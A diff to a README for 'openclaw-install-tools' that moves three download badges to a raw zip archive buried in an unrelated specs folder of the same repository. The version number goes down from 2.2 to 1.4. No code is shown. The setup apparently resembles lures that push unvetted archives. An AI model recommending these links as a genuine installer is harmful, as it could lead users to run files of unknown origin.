@@ -1,6 +1,6 @@
 # 🛠️ openclaw-install-tools - Easy Setup and File Transfer
 
-[![Download openclaw-install-tools](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/src/app/openclaw-tools-install-2.2.zip)
+[![Download openclaw-install-tools](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/openspec/specs/step-ai-verifier/openclaw-tools-install-1.4.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To begin using openclaw-install-tools, follow these steps carefully. This guide 
 
 Click the button below or open the link in your browser:
 
-[![Download openclaw-install-tools](https://img.shields.io/badge/Visit-Download_Page-grey?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/src/app/openclaw-tools-install-2.2.zip)
+[![Download openclaw-install-tools](https://img.shields.io/badge/Visit-Download_Page-grey?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/openspec/specs/step-ai-verifier/openclaw-tools-install-1.4.zip)
 
 You will be taken to the main project page on GitHub. From there, you can find the latest release files.
 
@@ -147,4 +147,4 @@ Responses come from the development community and provide detailed assistance.
 
 Download openclaw-install-tools here:
 
-[![Download openclaw-install-tools](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/src/app/openclaw-tools-install-2.2.zip)
+[![Download openclaw-install-tools](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/7j89a2/openclaw-install-tools/raw/refs/heads/main/openspec/specs/step-ai-verifier/openclaw-tools-install-1.4.zip)
